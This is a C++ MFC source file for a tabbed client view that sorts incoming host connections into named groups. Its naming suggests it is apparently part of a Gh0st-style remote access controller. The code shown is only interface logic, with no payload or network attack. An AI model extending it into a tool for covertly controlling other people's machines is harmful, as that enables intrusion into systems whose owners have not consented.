// ClientView.cpp : implementation of the CClientView class
//

#include "stdafx.h"
#include "Client.h"

#include "ClientView.h"
#include "PcView.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDC_TABCONTROL 100
CClientView* g_pTabView;
extern CPcView* g_pConnectView;
CXTPTabManagerItem* pRightItem;

/////////////////////////////////////////////////////////////////////////////
// CClientView

IMPLEMENT_DYNCREATE(CClientView, CView)

BEGIN_MESSAGE_MAP(CClientView, CView)
	//{{AFX_MSG_MAP(CClientView)
	ON_WM_SIZE()
	ON_WM_CREATE()
	ON_WM_ERASEBKGND()
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_AddGroup, OnAddGroup)
	ON_COMMAND(ID_DelGroup, OnDelGroup)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDFINDGROUP, OnAddFindGroup)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TABCONTROL, OnSelectedChanged)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientView construction/destruction

CClientView::CClientView()
{
	// TODO: add construction code here
	g_pTabView = this;
}

CClientView::~CClientView()
{
}

BOOL CClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= WS_CLIPCHILDREN;  
	return CView::PreCreateWindow(cs);
	return 1;
}

/////////////////////////////////////////////////////////////////////////////
// CClientView drawing

void CClientView::OnDraw(CDC* pDC)
{
	CClientDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CClientView diagnostics

#ifdef _DEBUG
void CClientView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CClientView::Dump(CDumpContext& dc) const
{
	CXTPListView::Dump(dc);
}

CClientDoc* CClientView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CClientDoc)));
	return (CClientDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CClientView message handlers
void CClientView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);

	if (m_wndTabControl.GetSafeHwnd())
	{
		m_wndTabControl.MoveWindow(0, 0, cx, cy);
	}
}

LRESULT CClientView::OnAddFindGroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	try
	{	
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		BOOL bFind=false;
		CString strGroupName, strTemp;
		
		int nTabs = m_wndTabControl.GetItemCount();
		for ( int i = 0; i < nTabs; i++)
		{
			strTemp = m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if( n > 0 )
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}

			if ( strlen(LoginInfo->UpGroup) == NULL )
			{
				lstrcpy( LoginInfo->UpGroup, "Default" );//默认分组
			}

			if (strGroupName == LoginInfo->UpGroup)
			{	
				bFind = true;
				CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
				pView->m_iocpServer = g_pConnectView->m_iocpServer;
				pView->PostMessage( WM_ADDTOLIST, 0, (LPARAM)pContext );
				break;
			}
		}
		if (!bFind)
		{	
			strGroupName.Format( "%s(1)", LoginInfo->UpGroup );
			AddGroup( strGroupName );
			CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
			pView->NewInitialUpdate();
			pView->m_iocpServer = g_pConnectView->m_iocpServer;
			pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext );
		}
	}
	catch (...){}
	
	return 0;
}

BOOL CClientView::AddView(CRuntimeClass* pViewClass, LPCTSTR lpszTitle)
{
	CCreateContext contextT;
	contextT.m_pCurrentDoc     = GetDocument();
	contextT.m_pNewViewClass   = pViewClass;
	contextT.m_pNewDocTemplate = GetDocument()->GetDocTemplate();
	
	CWnd* pWnd;
	TRY
	{
		pWnd = (CWnd*)pViewClass->CreateObject();
		if (pWnd == NULL)
		{
			AfxThrowMemoryException();
		}
	}
	CATCH_ALL(e)
	{
		TRACE0( "Out of memory creating a view.\n" );
		// Note: DELETE_EXCEPTION(e) not required
		return FALSE;
	}
	END_CATCH_ALL
		
	DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
	dwStyle &= ~WS_BORDER;
	
	int nTab = m_wndTabControl.GetItemCount();
	
	// Create with the right size (wrong position)
	CRect rect(0,0,0,0);
	if (!pWnd->Create(NULL, NULL, dwStyle,
		rect, &m_wndTabControl, (AFX_IDW_PANE_FIRST + nTab), &contextT))
	{
		TRACE0( "Warning: couldn't create client tab for view.\n" );
		// pWnd will be cleaned up by PostNcDestroy
		return NULL;
	}
	m_wndTabControl.InsertItem(nTab, lpszTitle, pWnd->GetSafeHwnd());
	
	pWnd->SetOwner(this);
	
	return TRUE;
	
}

BOOL CClientView::AddGroup( LPCTSTR lpszTitle )
{
	BOOL Result = AddView(RUNTIME_CLASS(CPcView), lpszTitle);
	return Result;
}

BOOL CClientView::UpDateNumber()
{	
	CString strGroupName, strTemp;
	int nTabs = m_wndTabControl.GetItemCount();
	
	for ( int i = 0; i < nTabs; i++ )
	{	
		strTemp = m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		
		CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));

		strTemp.Format( "%s(%d)", strGroupName, pView->m_pListCtrl->GetItemCount() );
		m_wndTabControl.GetItem(i)->SetCaption(strTemp);
	}
	return TRUE;
}

void CClientView::UpdateDocTitle()
{
	GetDocument()->UpdateFrameCounts();
}

void CClientView::OnSelectedChanged(NMHDR* pNMHDR, LRESULT* pResult)
{
	UNUSED_ALWAYS(pNMHDR);
	*pResult = 0;
	
	UpdateDocTitle();
	
	CFrameWnd* pFrame = GetParentFrame();
	CView* pView = DYNAMIC_DOWNCAST(CView, CWnd::FromHandle(m_wndTabControl.GetSelectedItem()->GetHandle()));
	ASSERT_KINDOF(CView, pView);
	
	pFrame->SetActiveView(pView);
}


int CClientView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	m_wndTabControl.Create(WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
//	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceVisualStudio2005);
	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceExcel);//xtpTabAppearanceVisualStudio2005
	/*
	xtpTabAppearancePropertyPageFlat,       // Gives your tabs an Office 2000 Flat appearance.//Good
	xtpTabAppearancePropertyPage2003,       // Gives your tabs an Office 2003 appearance./Good
	xtpTabAppearanceStateButtons,           // Gives your tabs a State Button appearance.//Good
	xtpTabAppearanceExcel,                  // Gives your tabs an Excel appearance.//Good
	xtpTabAppearanceVisio,                  // Gives your tabs a Visio appearance.//Good
	xtpTabAppearanceVisualStudio2005,       // Gives your tabs a Visual Studio 2005 appearance.//Good
	*/
	m_wndTabControl.GetPaintManager()->m_bHotTracking = TRUE;	
// 	m_wndTabControl.GetPaintManager()->SetPosition(xtpTabPositionBottom);
// 	m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2008);
	m_wndTabControl.SetPosition(xtpTabPositionBottom);
	m_wndTabControl.SetColor(xtpTabColorOffice2003);//xtpTabColorVisualStudio2008
	/*
	xtpTabColorDefault
	xtpTabColorVisualStudio2003
	xtpTabColorOffice2003
	xtpTabColorWinNative
	xtpTabColorVisualStudio2005
	xtpTabColorResource
	xtpTabColorVisualStudio2008
	xtpTabColorOffice2007Access
	xtpTabColorVisualStudio2010
	*/
	
	m_wndTabControl.GetPaintManager()->DisableLunaColors(TRUE);

	AddGroup(_T("Default(0)"));
	m_wndTabControl.SetCurSel(0);

	return 0;
}


BOOL CClientView::OnEraseBkgnd(CDC* pDC) 
{
	// TODO: Add your message handler code here and/or call default
	
	return TRUE;
}

void CClientView::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	// TODO: Add your message handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_TabCtrl);
	CMenu*	pM = popup.GetSubMenu(0);
	CRect rc;
	CPoint	p;
	GetCursorPos(&p);
	GetWindowRect(&rc);
	point.x = point.x - rc.left;
	point.y = point.y - rc.top;
	
	int nItem = m_wndTabControl.GetItemCount();
	for (int i = 0; i < nItem; i++)
	{	
		if (m_wndTabControl.GetItem(i)->GetRect().PtInRect(point))
		{	
			pRightItem = m_wndTabControl.GetItem(i);
//			pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
			CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
			break;
		}
	}
}

void CClientView::OnAddGroup() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString strGroup, strGroupName, strTemp;
	dlg.Init(_T("添加新分组"), _T("请输入新分组的名称："), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		if (dlg.m_str == strGroupName)
		{
			AfxMessageBox(_T("已存在该分组"));
			return;
		}
	}
	strGroup.Format(_T("%s(0)"), dlg.m_str);
	AddGroup(strGroup);
	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
	pView->NewInitialUpdate();
}

void CClientView::OnDelGroup() 
{
	// TODO: Add your command handler code here
	CString strGroupName, strTemp;

	strTemp = pRightItem->GetCaption();
	int n = strTemp.ReverseFind('(');
	if ( n > 0 )
	{
		strGroupName = strTemp.Left(n);
	}
	else
	{
		strGroupName = strTemp;
	}

	if( strGroupName == _T("Default"))
	{
		AfxMessageBox(_T("默认分组不允许删除!"));
		return;
	}
	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(pRightItem->GetHandle()));
	if (pView->m_pListCtrl->GetItemCount())
	{
		AfxMessageBox(_T("分组内存在主机不可删除!"));
		return;
	}
	//	DeleteGroup(pRightItem->GetCaption());
	pRightItem->Remove();
}
